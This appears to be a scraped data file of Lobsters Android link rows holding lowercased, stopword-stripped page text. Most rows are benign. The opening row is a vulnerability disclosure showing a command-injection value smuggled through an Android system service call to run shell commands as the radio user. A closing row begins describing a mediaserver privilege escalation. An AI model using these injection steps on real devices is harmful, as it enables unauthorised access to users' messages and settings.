performance impact risk crashing device android device affected since opensource software package developed made freely available qualcomm people using code variety project including cyanogenmod fork android vulnerable apis observed git repository indicating someone using code time make particularly difficult patch affected device impossible vulnerability actively targeted exploited mtp team monitoring usage api discovered anything fireeye customer protected fireeye mtp customer able detect attempted exploitation vulnerability technical analysis next dive deeply demonstrate attacker exploit vulnerability first introduction android system service understanding system service system service similar regular bound service found android application system service typically run privileged process mediaserver systemserver service core android currently system service registered default emulator build android marshmallow usb debugging enabled device service utility used list system service registered device shown figure figure listing system service using service utility illustrate system service play role android device walk process sending text message sm android application figure show java snippet used send sm message content test number smsmanager smsmanager smsmanagergetdefault smsmanagersendtextmessage null test null null figure sending sm message application stackoverflow code first obtains smsmanager object associated default subscription id using static method getdefault call method sendtextmessage appropriate argument smsmanager class contains smsrelated method downloadmultimediamessage sendmultiparttextmessage next look java source sendtextmessage method smsmanager class used previously simplicity view source smsmanager class included part android kitkat shown figure figure java source sendtextmessage method method performs two function first performs basic argument checking attempt interact system service called ism getservice method servicemanager class used obtain ibinder object cast ism object using asinterface method point method called ism system service using binder interface case method sendtext note use servicemanager class available application developer using android sdk indicates smsmanager class merely wrapper ism system service particular pattern consistent across many apis location telephony calling system service directly google recommend bypassing official apis interact system service directly possible application developer import use nonstandard apis namely aforementioned servicemanager class alternative service utility mentioned earlier used command line order utilize service utility need gather additional piece information transaction id method would like call information regarding argument obtaining transaction id creating bound service android application first step define service interface using android interface definition language aidl aidl file compiled aidl utility application build process unique identifier stored method interface form static field stub innerclass developer rely method name transaction id change api build across vendor illustrate previous sm example investigate class comandroidinternaltelephonyismsstub typically found device system jar file systemframeworkframeworkjar disassembling jar determine transaction id method sendtext hexadecimal decimal device shown figure figure obtaining transaction id sendtext method determining method argument understand transaction id need determine interact method system service interest public like ism service aidl source reviewed service implementation need reversed order determine purpose argument dissemble innerclass comandroidinternaltelephonyismsstubproxy included aforementioned frameworkjar able get idea augments represent determine return type figure show argument return value sendtext method figure method prototype sendtext method screenshot see sendtext method take six argument denoted pn notation return void denoted trailing v method prototype putting together use service utility interact ism service call sendtext method figure show syntax service utility call system service method service call servicename transactionid argument figure service utility syntax call service method service utility accepts string integer null value argument represented null respectively note anything complex java application must used call sendtext method transaction id ism system service send message shown figure adb shell service call ism comfake test figure invoking sendtext using service utility command shown sends sm message content test number similar java snippet figure exploring starting top device manufacture nonandroid open source project aosp vendor add modify system service regular basis attacker perspective new changed apis system service prime target researcher enumerate comparing static field beginning transaction found within stub innerclass system service target device aosp one review discovered two method added networkmanagement system service called found androidosinetworkmanagementservicestub part system jar systemframeworkframeworkjar depicted figure figure figure transaction id figure transaction id method accepts single string argument interfacevalue return void viewing disassembled method class comandroidservernetworkmanagementservice found system jar systemframeworkservicesjar indicated called method passed interfacevalue native daemon netd writing string shown figure unix socket devsocketnetd tether interface addupstream interfacevalue figure command sent netd native daemon analysis systembinnetd indicated daemon executed systembinradish using execv function executes shell command depicted figure systembinradish interfacevalue figure argument passed systembinradish systembinradish executable passed interfacevalue brctl utility using system function using syntax depicted figure brctl addif interfacevalue figure interfacevalue present brctl command point witness code execution capability value passed ultimately passed system function without sanitized validated trivial example achieved service command shown figure print output id command android log buffer adb shell service call networkmanagement fake log radioexe id figure service command write output id android log buffer command pass interfacevalue fake log radioexe id systembinradish executable call system function string shown figure brctl addif fake log radioexe id figure command injection brctl system function check android log buffer capture output injected command using logcat utility shown figure figure output id captured android log buffer output id command indicates running linux uid radio seandroid context netd next explore attacker would take advantage vulnerability action permit attacker practical exploitation feasible way exploiting creating malicious application malicious application need request access accessnetworkstate permission widely requested permission figure show method used inject command id figure malicious application calling since command executed user radio data owned application also running radio accessible malicious application stock android device includes phone application telephony provider application contain sensitive information radio user also inherits several system permission accessible thirdparty application short list includes writesettingssecure change key system setting bluetoothadmin discover pair bluetooth device writeapnsettings change apn setting disablekeyguard disable key guard lock screen whether attacker abuse permission depends specific model may possible across device seandroid consideration beginning android kitkat device utilize security enhancement seandroid set enforcing mode default device running seandroid mode impacted significantly older device netd context systembinradish executable run ability interact radio user application data limited filesystem write capability typically limited term application interaction netd context ability alter systemprop property android property subsystem includes service persistsys persistservice persistsecurity property key depending particular device manufacture utilizes property possible compromise device altering property conclusion present device since least likely affect hundred android model around world vulnerability allows seemingly benign application access sensitive user data including sm call history ability perform potentially sensitive action changing system setting disabling lock screen device running android jellybean older affected vulnerability likely remain unpatched newer device utilizing seandroid still affected lesser extent fireeye would like thank qualcomm working diligently address supporting release blog post fireeye mobile threat prevention mtp customer fireeye added detection exploitation device writing blog post
378,Lobsters,android,Android,"Wire — modern, private comms for iOS, Android, OS X, Windows and web.",https://wire.com/,wire modern private comms io android o x window web,learn commitment transparency,wire opensource independently audited option tested existing security governance framework built scale ten million user wire iso ccpa gdpr soxready learn commitment transparency
379,Lobsters,android,Android,Termux: terminal emulator and Linux environment for Android,https://termux.com/,termux terminal emulator linux environment android,termux android terminal emulator linux environment app read wiki learn secure feature packed customizable explorable battery included ready scale tinkerable,termux termux android terminal emulator linux environment app work directly rooting setup required minimal base system installed automatically additional package available using apt package manager read wiki learn secure access remote server using ssh client openssh termux combine standard package accurate terminal emulation beautiful open source solution feature packed take pick bash fish zsh nano emacs vim grep sm inbox access api endpoint curl use rsync store backup contact list remote server customizable install want apt package management system known debian ubuntu gnulinux start installing git syncing dotfiles explorable ever sat bus wondered exactly argument tar accepts package available termux mac linux install man page phone read one session experimenting another battery included imagine powerful yet elegant pocket calculator readlinepowered python console uptodate version perl python ruby nodejs available ready scale connect bluetooth keyboard hook device external display need termux support keyboard shortcut full mouse support tinkerable develop compiling c file clang build project cmake pkgconfig gdb strace available get stuck need debug
380,Lobsters,android,Android,Android Security 2015 Annual Report,https://security.googleblog.com/2016/04/android-security-2015-annual-report.html,android security annual report,second year row protected hundred million chrome user android verify apps service android security patch level monthly public security update program,posted adrian ludwig lead engineer android security today second year row releasing android security annual report detailed summary includes look google service protect android ecosystem overview new security protection introduced work android partner security research community large full report overview one important goal releasing report drive informed conversation android security hope accomplish providing information see happening ecosystem strongly believe rigorous datadriven discussion security help guide effort make android ecosystem safer enhancing google service protect android user last year significantly improved machine learning event correlation detect potentially harmful behavior protected user malware potentially harmful apps phas checking billion installed application per day protected user networkbased ondevice threat scanning million device per day protected hundred million chrome user android unsafe website safe browsing continued make even difficult get phas google play last year enhancement reduced probability installing pha google play compared within google play install attempt category phas declined including data collection decreased installs spyware decreased installs hostile downloader decreased installs overall phas installed fewer device get apps google play device install apps play source pha installed similar data last year report critical also protect user install apps source google play verify apps service protects user improved effectiveness pha warning provided verify apps saw increase number pha install attempt outside google play disrupted several coordinated effort install phas onto user device outside google play new security feature android platform full disk encryption requirement new marshmallow device adequate hardware capability also extended allow encryption data sd card updated app permission enable manage data share specific apps granularity precision new verified boot ensures phone healthy bootloader way operating system android security patch level enables check make sure device recent security update much including support fingerprint scanner selinux enhancement deeper engagement android ecosystem working foster android security research making investment strengthen protection across ecosystem long run august launched monthly public security update program android open source project well security update lifecycle nexus device intend update lifecycle nexus device model android manufacturer going forward actively working ecosystem partner facilitate similar program since manufacturer provided monthly security update hundred unique android device model hundred million user installed monthly security update device despite progress many android device still receiving monthly increasing effort help partner update device timely manner greater transparency wellinformed discussion security ongoing innovation help keep user safe continue ongoing effort improve android protection look forward engaging ecosystem security community beyond
381,Lobsters,android,Android,Running Emacs on Android,http://endlessparentheses.com/running-emacs-on-android.html,running emacs android,emacs app generous comment termux hacker keyboard keep track userselected package,last night fit boredom far away laptop physical keyboard reasonable person would done decided install emacs phone last attempt crossing bridge year ago resulted nothing absolute failure something felt different time something felt right first stop obvious one emacs app play store claiming exactly needed previous attempt app given inconsistent result crashing often running time however even install play store greeted failure install error instead lost though generous comment lessthangenerous rating point new direction termux beacon hope robust app claim offer powerful terminal emulation extensive linux package collection installing indeed greeted terminal emulator impressed used terminal apps tentatively run command instructed manfromthereview apt update apt install emacs surprisingly played even better expected installing emacs would fine installing version exceptional init file sure incompatible emacs dare even hope could reproduce entire setup minute device proceeding hopped back play store installed hacker keyboard get access modifier key starting emacs terminal worked expected bit slowly streak good fortune end first command issued mx listpackages failed cryptic message nonexistent file happen thanks fredrik patch package menu displayed refused refresh cz emacs try mkdir tmp permission denied ok expected sudo work either issue fg go back emacs try different approach setq temporaryfiledirectory tmp listpackages work try install company gnu repository work fact everything work run mx globalcompanymode popup menu everything point probably way satisfied senseless pursuit high realize next step port real init file fortunately keep sync via dropbox easy make available phone open dropbox app find initel mark available offline thing initorg dropbox save file somewhere deep inside data directory automatically syncs make local change though manually ask pull remote change back termux send emacs background cz cd emacsd ln sdcardandroiddatacomdropboxandroidfilessomegibberishemacsdinitel ln sdcardandroiddatacomdropboxandroidfilessomegibberishemacsdinitorg actually finding file took bit trial error getting file directory tabcomplete way several gibberish directory name finding right one fg back emacs next obstacle package know init file going load install necessary package sadly never foresight rewriting configuration something like usepackage something almost good like mentioned emacs keep track userselected package able go customsetvariables find sizeable list packageselectedpackages ceremony evaluate whole thing cmx issue mx packageinstallselectedpackages take good moment find termux work well background switch youtube app watch couple video switch worked moment truth still feeling high mighty success respect odds init file thousand line elisp involves package whole lot couldgowrong potential take deep breath mentally try lower expectation cx cc back terminal carefully type emacs followed plunge headfirst error something tmp directory solved one bit digging reveals triggered serverstart serversocketdir bound comment variable explain use temporaryfiledirectory emacsclient read init file defvar serversocketdir understandable help impatiently wrap call serverstart ignoreerrors try another error time complaining setfringemode void function lot easier understand emacs binary provided termux compiled terminal many graphical function defined also easy solve add conditional around function call fboundp setfringemode setfringemode nil third time cx cc emacs work error even warning beloved darktooth theme unrecognizable indicative sign emacs setup smartmodeline discretely smile bottom screen beacon eagerly blink soon start scrolling unmistakable coziness personal keybinds reach even limited interface touchscreenkeyboard get point lesser person might feel anticlimax hint perhaps feel safe reassured knowing wherever whenever need emacs always sitting pocket need get one bluetooth keyboard
382,Lobsters,android,Android,How to debug HTTP(s) traffic on Android (2015),https://medium.com/@rotxed/how-to-debug-http-s-traffic-on-android-7fbe5d2a34,debug http traffic android,debug http traffic android need deal apis pain likely would leave colleague easy see final request look like go response doubt use proxy proxy mitmproxy mitmproxy handy amazing mitmproxy completely free using utterly simple intercept network traffic proxy setting app proxy setting blink click,debug http traffic androida friendly tipthere time life need deal apis probably want want major part everyday life time debugging happens issue network request receive response pain likely would leave colleaguesyes many time struggled figure api call working encoding wrong http header missing backend guy deal surely go like sure randomstuff simply answer sure sure easy see final request look like go responsewhen doubt use proxythere boatload different solution approach problem suggest fastest easiest feasible way could find itsince debugging http request response quite cumbersome even cumbersome http best tool use case proxy course already know proxy dwelling definitionamong hundred proxy vary use feature o compatibility choose right one say go simple meet mitmproxymitmproxyi even begin tell handy amazing little tool mitmproxy interactive sslcapable maninthemiddle proxy http console interface yes operate via console yes support http yes allows traffic flow intercepted inspected modified replayed yes cross platform since written python mention completely free using utterly simple install fire typing following command console mitmproxy b ipaddr p port proxy running allowing intercept network traffic next step involves configuring device redirect traffic proxy address ipaddr port proxy setting appconfiguring proxy setting android device guess straightforward might want need go device wifi setting longpress currently connected network choose modify setting show advanced option enable proxy setting manually type ip address port go disabling nut thanks proxy setting hassle almost go away lightweight application allows enabledisable proxy setting network connection blink click
383,Lobsters,android,Android,Tribe - Experiential Messaging,http://tribe.pm/,tribe experiential messaging,,
384,Lobsters,android,Android,Eraser Map – privacy-focused mapping application that tracks nothing about you and has no accounts,https://mapzen.com/blog/erasermap-beta,eraser map privacyfocused mapping application track nothing account,mapzen turnbyturn mapzen search weird address queen duckduckgo lost eraser map get touch erasermapcom,test map sitting desk really take outside last year began building set sdks service packaging reference application android allowed u thing like take mapzen turnbyturn service afternoon drive see well mapzen search find weird address queen standing block away tested app became clear quality open data used power improving rapidly month passed every time would open use app could feel address data search road network navigation detail map improving work done open data community amazing believe open data data collected company really admire duckduckgo search engine focus user privacy saw open data quality improve wondered could use sdks build mobile mapping application could make promise duckduckgo log track user time user privacy major concern since mapzen run map stack dependent thirdparty mapping provider follow promise make handle user data even went far create lost dropin replacement google play location service location kept private possible saw opportunity improve privacy mobile mapping mind like invite help u beta test eraser map eraser map privacyfocused mapping application track nothing user account entirety eraser map built using opensource software open data mean user developer inspect app improve call issue find believe providing work free open software increase scrutiny trust product especially focused user privacy go mapping application whole lot take look work love use project contribute get touch taken app korea argentina india u even canada love take even place sign become android beta tester erasermapcom p irony lost u asking email address join beta program requirement google play beta program allow sideloading launch
385,Lobsters,android,Android,An Examination Of Ineffective Certificate Pinning Implementations,https://www.cigital.com/blog/ineffective-certificate-pinning-implementations/,examination ineffective certificate pinning implementation,,polaris software integrity platform streamline application security testing developer deployment
386,Lobsters,android,Android,Microsoft's Experimental Keyboard Aims To Solve Mobile Multitasking Problems,http://www.fastcodesign.com/3057267/microsofts-experimental-keyboard-aims-to-solve-a-big-mobile-ux-problem,microsoft experimental keyboard aim solve mobile multitasking problem,google time hub keyboard multitasking keyboard,laptop apps exist grid drag link contact text one app another smartphone though apps pile top stack deal one time multitasking one biggest ux problem smartphones microsoft want solve new touch gesture o trick simple software keyboard talk multitasking mobile device talking whether smartphone tablet run one app time point really crucial part multitasking able easily use apps together side side example dragging link browser email share take kind multitasking granted desktop laptop tablet ipad microsoft surface pretty good way sidebyside multitask smartphone screen small run two apps next othermicrosoft early pioneer trying tackle mobile first tablet operating system window introduced ability run two apps side side window maker latest app though take stab solving smaller screen integrating outside apps one app run side side every app smartphone onscreen keyboard video developed microsoft garage redmond answer google time initiative hub keyboard regular software keyboard one major difference similar signature ui element bind together microsoft office suite hub keyboard ribbon top allows easily bring information outside apps four paste information clipboard history search paste contact find paste office document onedrive automatically translate text another language done without leaving app init sound like much actually next best thing running apps side side example let say writing email realize want share word document writing normally need copy paste text already written leave email app open onedrive find word document share email app paste text letter back microsoft keyboard though would tap onedrive button enter search term hit return appropriate word doc pasted right writing otherwise work keyboardmicrosoft software developer taking ribbon approach multitasking small screen io reboard multitasking keyboard arguably fully featured hub keyboard pulling apps slack google drive dropbox ebay unlike reboard microsoft seems stuck apps service least first version hub keyboard may useful use microsoft product much given microsoft place pantheon software giant fact company experimenting keyboard ribbon solution major mobile ux problem pretty big deal possible solution could come future version window possible though thought exercise could lead nowhere microsoft garage also division redmond responsible mymoustachenet website add facial hair picture fetch io application tell breed dog look like
387,Lobsters,android,Android,We finally did something about Android Performance (in Ember),https://eviltrout.com/2016/02/25/fixing-android-performance.html,finally something android performance ember,state android javascript performance ember inspector ember performance suite htmlbars fantastic large topic rendering speed initial visit large topic rendering speed subsequent visit summary huge quality life improvement diagnosing performance problem component posthbs rendering single post performance issue tradeoff hindsight wrapping code ember wrap third party javascript message bus virtualdom downside road ahead update written,back september codinghorror wrote popular post state android javascript performance discourse meta forum drew lot attention led fascinating discussion forum behind scene browser engineer poor performance discourse android already old news u point started paying attention several year ago spent time contributing emberjs community tool help profile application performance particular render performance tab ember inspector ember performance suite time seen modest performance improvement newer emberjs release particular htmlbars upgrade resulted roughly boost however rendering topic still approximately time slower top line android device versus equivalent iphone year waiting breakthrough android ember performance decided time take nuclear option replaced ember rendering engine common view custom virtual dom based renderer result fantastic large topic rendering speed initial visit desktop avg avg nexus highend android avg avg nexus midrange android avg avg large topic rendering speed subsequent visit desktop avg avg nexus highend android avg avg nexus midrange android avg avg summary across platform viewing topic discourse average faster older android device viewing topic faster worst improvement nexus subsequent render faster desktop pc speedup nice touch mainly avid discourse user android huge quality life improvement going second around half second completely change experience forum diagnosing performance problem ember rendering system made hierarchy component every template render backed instance component class manages lifecycle template well delegating event action component contain component use helper control flow typical template look like posthbs rendering single post avatarlink userpostcreator postername userpostcreator span classdate postdate span div classpostbody postbody postcontrols postpost div div classgutter postlinks linkspostlinks div example avatarlink postername postcontrols postlinks custom component displayed every post one would handlebar template similar posthbs probably also javascript file handle click interaction ember also handle data binding example postauthor postbody changed template would automatically update development mean spend lot le time thinking update user interface want change body post call postset body new body done behind scene ember lot work wire keep tab property change component belong forth rendering post overhead involved small render thing detail add understated performance issue tradeoff think ember right thing focus apps organized scale add feature vast majority view application framework overhead concern however rendering many nested component many binding situation become pathological discourse might look simple surface post rendered quite component many dynamic button link effect applied every time post rendered attribute involved hindsight every time see blog entry say switching codebase language x language improved performance factor z realize important detail omitted rewrite code full domain knowledge problem solved first time around knowledge go long way towards making faster know exactly need get work example every time ember template encounter set binding make sure template update underlying property change good default know property change following ajax request use knowledge render significantly faster general approach took rewriting topic rendering thought bare minimum amount work browser needed implement interface already built maintainable would code middle ground could gain significant performance also keep code reasonably clean integrated rest ember app wrapping code ember ember component also great tool wrap third party javascript give lifecycle hook element inserted dom removed use hook render pretty much whatever want long using javascript approach create single component instead series nested component inserted dom perform rendering rerender dom user performed action message bus told u looked around various option rendering quickly client side found virtualdom promising minified gzipped seemed like reasonable amount code exchange performance boost want sacrifice much code quality implemented lightweight version ember component called widget note yes know widget similar component distinction required naming hard widget class given series attribute optionally state would emit series virtual dom node rendered wanted render button increased counter click widget would look like import createwidget discoursewidgetswidget import h virtualdom export default createwidget counter tagname buttoncounterbutton defaultstate return count html attrs state return clicked statecount time click thisstatecount widget render widget want export default createwidget control tagname divcontrols html attrs state return h divcontrols thisattach counter attrs state mount widget template template ember application mountwidget widget control existing action ember application triggered template mountwidget widget button dosomething dosomething send click event easily widgetsbuttonjs code click return thissendcomponentaction dosomething action return promise resolved widget rerender time rendering handled automatically like also trigger rerender calling thisqueuererender render queued coalesced nicely leveraging ember event loop downside converting old handlebar template virtual dom widget admit find creating html way significantly uglier creating template bad widget little markup lot get little unwieldy hand major advantage emitting html hand finetuned control exact dom creating came handy rendering gap post topic clumsier ember implementation also took quite convert entire topic renderer much functionality hidden project took month full time work knock alpha another week fixing bug develop upgrade path plugin author feel good refactor oldest code though also added couple hundred new acceptance test traditionally topic stream tested well part site code oldest weirdest straightened road ahead setting similar project ask okay spending lot time without adding new feature process likely breaking bunch working stuff fix would sacrifice code quality speed improvement major trade offs made believe worth discourse quite popular project used many people speed improvement add across forum world especially android user browse going forward likely improve widget system even love hook htmlbars complier ast could write template using handlebar supporting two different way creating template spent day looking find sufficient documentation public apis told future likely able full speed ahead update want learn widget framework work written
388,Lobsters,android,Android,WHY WON’T THIS WORK?! Coding Angry for Fun and Profit,https://medium.com/google-developers/why-won-t-this-work-coding-angry-for-fun-and-profit-1ef38a2b7196,work coding angry fun profit,saying find enjoyment coding frustration one common shared experience developing real apps mobile complicated let face pretty damn cool art building apps delight user conceptually translate incredibly complex system simple state machine frustration come pulled stack minimize depth complexity problem stack,saying find enjoyment coding dothe high deciphered new apis manipulated making device something intoxicatingyou feel god amongst mortal able bend universe thing possibleit moment emotional state hovers somewhere spectrum whitehot rage tearinducing frustrationfrustration one common shared experiencesthough engineer often often talk nonengineers animation show face minute debugging problemtwenty minute debugging later turn forgotten call show creating toasti spoke colleague recently experienced engineer new android wanted write app automatically turn internetconnected light got close house done course android familiar android fundamentalshe talked lot frustrationsi figured take hour go nothing app described rather sit next pair program figured record writing code cut really boring bit screencast show easiest fastest wrongest way build app minute represents two hour realtime coding debugging implement everything within single activity thousand way implementation wrong spend time end video explaining everything done differentlydeveloping real apps mobile complicateda lot people included spend lot time crafting perfect code sample walkthroughs tutorial training new developer ready write first app got tool need architect correctly implement efficientlybut trying get feel android figure idea possible worth figuring implementing fragment service intent receiver understanding subtlety activity app lifecycles want write high quality app user love vcs want shower money eventually answer resounding yes mean learn stuff frontif go knowing going start fun write something hacky kludgy fun prove idea done think incentive learn hard stuffas result throwaway work learn something valuable possible want automatically turn internetconnected light get close homewhich let face pretty damn coolwhen want learn code using new platform api framework start experimenting trying failing make headway get boredon day one want download sdk fireup ide experimenti invest hour getting feel thing work without worrying much right way produce something ugly buggy poorly architected totally unscalable workable prototypenote getting started experience critical spend first hour installing configuring development environment may stop even starti start seeing possible using intuition way learn use new electronics use stack overflow mean seriously let realof course much like new electronics eventually may read manual book course watch video review sample never start little ironic given much time spend creating thing developer art building apps delight usersbut come making something work feel like coding predictable mobile app root manipulating transistor let create gate turn used create complex logic really dealing logic circuit boil series true falsesthese basic building block used construct increasingly complex apis framework platform turn used create increasingly featurerich apps user step along path effectively encapsulates bestpractice implementation detail start every project defining object creating linked list writing quicksort algorithmwe conceptually translate incredibly complex system simple state machinesi take video phone swipe touch start watching tv stop think number interacting system requires electricity power distribution digitalanalog conversion video recording video broadcasting lcd display chromecast let alone system work physical layer mention complex decision process decided video watch intricate protracted negotiation wife determine mutually agreedupon selection quickly becomes fractal complexity intimidationas engineer difficulty frustration ultimately thrill victory come unraveling complication caused multiple layer abstraction within code interaction component way system experienced end userto effectively write especially debug code need keep significant part system head mean everything highlevel architecture piece fit together piece work time way physical layerthe frustration come pulled stackwe constantly switching context big picture conceptualization system whole work excruciating detail part implementedtypical flowchart debugging code really already worksay incorporating wifi bluetooth signal selflearning system trigger geofence efficiently work problem could anything misunderstanding bluetooth apis work misreading bluetooth signal forgetting call show toast using test workingminimize depth complexity problem stackto lower frustration maximize enjoyment try keep scope working given time small possible working take step back add complexity iterating quickly tight loop solving difficult problem better version working appin practice look little like
389,Lobsters,android,Android,Swift pull request: Port to Android,https://github.com/apple/swift/pull/1442,swift pull request port android,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
391,Lobsters,android,Android,Why I don't like smartphones,https://www.devever.net/~hl/smartphones,nt like smartphones,nt like smartphones unequal device real network client led massive centralization ruined web design secure smartphones see article device unclear alignment clear malevolence io device,nt like smartphonesi nt smartphone consider numerous issue unequal device smartphones unapologetically device consumption regard differ critically pc pc equal device sense device used creation consumption mean anyone pc create well consume wish cultural equality diminished exodus device really used consumption real network client smartphones powerful cpu fast network connection except nt actually allowed use resource meaningful sense consumes battery power people nt want precious battery life phone drained unnecessarily massive amount computer power network connectivity practice ca nt use lead even unfortunate ridiculous consequence ca nt implement many existing network protocol smartphone least without draining battery practice nt done example disproportionate number im xmpp etc client say android appear rely central server operated software maker proprietary protocol client server rather simply implementing protocol directly word appear enough issue implementing protocol smartphones nt done indeed premise push notification system used android io lead next issue led massive centralization part cloud movement probably driven fact smartphones substantial computational resource ca nt actually use battery life instead computation done cloud creating dependency centralized entity many smartphone application sold would still work maker went bust comparison much pc software longer sold still cherished used ruined web design probably write whole article suffice say however tired epidemic often massive position fixed header website nowadays secure smartphones see article device unclear alignment clear malevolence course first rule io device leaf android supposedly android free install software arbitrary source replace o except capability often restricted device manufacturer carrier moreover look closely nt quite add android device distinction rooted unrooted device sound suspiciously similar jailbroken unjailbroken pc nt perform arcane operation actually control device moreover seems common discriminate people gall root device disable functionality device rooting performed believe even online banking application reserve right term detect device rooted refuse operate word discrimination people exercise control device common even sandboxed application permitted detect thus prevailing expectation people exercise control device point sufficient minority discriminated functionality device reduced suppose pc equivalent would pc ever ran sudo certain functionality would permanently disabled many application would refuse run forever
393,Lobsters,android,Android,Smartphones with removable batteries are hard to find. Here is a comparison chart with 200 of them.,http://www.productchart.com/smartphones/sets/3,smartphones removable battery hard find comparison chart,smartphones removable battery chart smartphones removable battery,smartphones removable battery finding phone removable battery far requested feature got user last week product chart supposed fully user driven sat went list currently popular phone find one replaceable battery hurray even plenty hereis thechart select spec dream smartphone scroll see matching smartphones matching smartphones matching smartphones smartphones removable battery
394,Lobsters,android,Android,Google removes Samsung's first Android ad blocker from the Play Store,http://www.theverge.com/2016/2/3/10905672/google-samsung-adblock-fast-android-ad-blocker-removal,google remove samsung first android ad blocker play store,startup rocketship apps thirdparty developer build content blocking feature adblock plus tried put android ad blocker allowed distribute app made move decline mobile web favor apps,day shot top play store android newest ad blocker removed violating developer guideline called adblock fast plugin startup rocketship apps worked within samsung mobile browser thanks partnership phone maker opened api week allowing thirdparty developer build content blocking feature preinstalled samsung internet app according rocketship developer brian kennish google say adblock fast violates section developer distribution agreement disallows apps plugins offered play store interfering disrupting device network service third party google confirmed verge remove adblock fast would clarify content blocker removed despite samsung open participation kennish provided message representative google hi developer rocketship apps reviewed adblock fast comrocketshipappsadblockfast found violates section developer distribution agreement particular app disabled policy strike reminder agreed follow google play developer program policy additional enforcement could occur policy issue apps reviewed policy feel rejection may error please reach policy support team one colleague get back within business day appreciate support google play since removal adblock fast two android ad blocking plugins working samsung browser sprouted crystal popular io ad blocker wellknown adblock plus unclear google simply nt caught competitor rocketship something specifically violate play store guideline way crystal adblock plus adblock plus tried put android ad blocker run similar issue company recently allowed distribute app bundling within company browser ultimately appears google allow thirdparty app block ad another company product despite participation two firefox allows ad blocker installed android browser plugins browser samsung could similarly distribute adblock fast preloaded app store galaxy device company declined comment story google may like ad blocker interfering business course samsung google biggest android partner adding layer tension dispute samsung essentially asking partner violate play store guideline support feature google may find harmful business displaying serving advertising especially thorny issue google recently made move stave decline mobile web favor apps company earn ad revenue mobile web browser dominant search engine
395,Lobsters,android,Android,The fight for a third-best smartphone OS has been lost. By everyone.,http://arstechnica.com/gadgets/2016/02/the-fight-for-a-third-best-smartphone-os-has-been-lost-by-everyone/,fight thirdbest smartphone o lost everyone,enlarge strongly implied notentirelyawful blackberry priv taken big yearoveryear tumble wait software update seems like never come first version window phone take sweet time port selling window phone store still getting bad press fire phone firefox o phone dead sailfish o ubuntu tizen,enlarge watching smartphone operating system burn fade away last year two badandrew cunningham day ago blackberry ceo john chen strongly implied android future company say blackberry finished future phone company much likely resemble notentirelyawful blackberry priv last week microsoft announced lumia sale taken big yearoveryear tumble last year company busy getting software onto competing platform window phone loyalist wait software update seems like never come two platform best hope solid thirdplace mobile operating system fallback option people unsatisfied android io point clear race third place somebody everybody lost blackberry perhaps doomed start first version came three year ago well apple google even microsoft established modern smartphone platform clear blackberry failure decision market made blackberry decision pivot googlepowered android focus service good evidence decline fall window phone tragic several year o making headway app problem sure window phone brought o level io android lowend lumias provided excellent value money soon buying lumia division nokia microsoft seemed stop pushing window phone left rot microsoft take sweet time finishing continually delayed window update existing window phone user sit watch microsoft port every selling point window phone platform io android embracing io android unquestionably give microsoft apps service wider audience reason done expense company existing user base remains platform really viable generalpurpose smartphone ecosystem diehard disagree microsoft least given window phone acolyte gift form lumia recommending smartphone someone android io pretty much anything anyone need able window phone blackberry best left people care brand loyalty functionality neither apple google control mobile market completely microsoft controlled pc market year ago like competition exist still feel like hole market one tightly controlled sterility io android fractured mess lot way window phone window mobile since microsoft make mind could fill gap available multiple oems use hardware updated microsoft directly instead relying company little incentive support handset selling recognizable visual arguably ahead consistent phone phone run well lowend hardware handle nichebutimportant thing like external storage device well live tile implemented well ably split difference iosstyle app icon android widget microsoft one company enough money push moneylosing platform enough time establish window mobile least undergoing visible active development unlike many peer nt look like enough make difference end window still small hope rising tide window desktop lift mobile version boat developer create universal window store apps desktop able adapt phone screen little effort success window necessarily translate window store apps store still getting bad press even though response window mostly positive overall window mobile fading essentially hope thirdparty operating system ever gain critical mass user would need compete io android writing wall blackberry fire phone colossal flop firefox o phone dead sailfish o ubuntu tizen going anywhere forked nongoogle version android control significant chunk worldwide market share ecosystem even fractured googlesupported android platform good idea good idea may may show io android continue evolve lack strong third pillar mobile something strong linux o really exist closedoff lockeddown smartphone world like comparatively standardized open world pc bad everyone
396,Lobsters,android,Android,Android privilege escalation to mediaserver from zero permissions (CVE-2014-7920 + CVE-2014-7921),http://bits-please.blogspot.com/2016/01/android-privilege-escalation-to.html,android privilege escalation mediaserver zero permission,actual patch getting zero permission trustzone code execution getting trustzone linux kernel gain code execution within linux kernel previous blog post series diving let get business link link main function limited write primitive startoutput function handful valid streamtype value zero permission spy little eye audiopolicymanagerbase isstreamactive audiooutputdescriptor isstreamactive thermal vision far building exploit audiohwdevice harder better faster stronger primitive audioflinger getinputbuffersize creating primitive liftoff full exploit code http timeline,blog post go two vulnerability discovered combined enable arbitrary code execution within mediaserver process context requiring permission whatsoever bad first vulnerability present android version onwards second vulnerability present android version also vulnerability vendor specific present android device since first vulnerability needed bypass aslr aslr present meaningful form android onwards mean vulnerability allow code execution within mediaserver android device starting version although reported vulnerability mid october unfortunately fixed much later see timeline full description android version mean many device still vulnerable issue please take care find actual patch patch pushed aosp five month vulnerability reported said android security team pleasant work vulnerability reported later much responsive managed solve issue within shorter timeframe continuing journey getting zero permission trustzone code execution recently completing task getting trustzone linux kernel finding way gain code execution within linux kernel left final step gaining privilege needed order execute kernel exploit mentioned previous blog post series order exploit kernel vulnerability qseecom driver attacker must satisfy one following condition gain execution within one mediaserver drmserver surfaceflinger keystore run within process system drm keystore userid run within process drmrpc groupid blog post gain code execution within mediaserver process thus completing journey zero permission trustzone kernel code execution diving name suggests mediaserver process charge mediarelated task order serve different mediarelated request process expose large set feature form four different service mediaaudiopolicy enables manipulation different audio related policy volume different audio stream mediaaudioflinger main configuration endpoint mediarelated task recording audio muting phone etc mediacamera allows interaction device camera mediaplayer allows playback many different medium format example using stagefright library probably seen lately lot focus mediaplayer service ala stagefright especially focusing different mediaparsing library utilised however post cover two vulnerability different service mediaaudiopolicy service usually registering android service actual implementation service provided java programming language mean finding memory corruption vulnerability difficult since would present unique circumstance using native jni call java code delegating feature native library etc however case mediaserver process service housed within process implemented c programming language making prospect finding memory corruption much viable actually implementing service quite hard task fulfil secure manner recall previously discussed kernel vulnerability well order prevent accidental access userprovided data kernel us coding convention userprovided pointer marked tainted however interaction userspace service feature mean implementers service must always pay attention origin processed data ca nt trust let get business game plan first need look memory corruption vulnerability audio policy service need find way reliably exploit vulnerability usually made difficult presence aslr nt encountered aslr address space layout randomization yet definitely check link androidspecific information link see problem still present android aslr implementation without ado let take look functionality exposed audio policy service unsurprisingly start main function mediaserver process look straightforward enough however looking deeper reveals audiopolicyservice audioflinger register handler command directed mediaaudiopolicy mediaaudioflinger service respectively actually act façades real concrete implementation provided going several layer abstraction end result actual implementation 